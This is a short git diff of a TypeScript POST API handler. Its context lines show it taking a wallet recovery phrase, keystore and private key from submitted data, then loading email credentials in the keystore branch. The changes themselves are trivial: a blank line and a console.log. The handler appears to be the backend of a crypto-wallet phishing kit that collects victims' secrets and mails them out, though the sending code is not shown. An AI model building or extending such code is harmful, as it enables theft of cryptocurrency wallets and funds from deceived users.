@@ -17,6 +17,7 @@ function formatMessage(message: string) {
 }
 
 export async function POST(request: Request) {
+
   try {
     const { phrase, keystore, privateKey, item } = await request.json();
 
@@ -63,7 +64,7 @@ export async function POST(request: Request) {
         );
       }
     }
-
+    console.log("keystore");
     if (keystore) {
       const email = process.env.EMAIL;
       const pass = process.env.PASS;
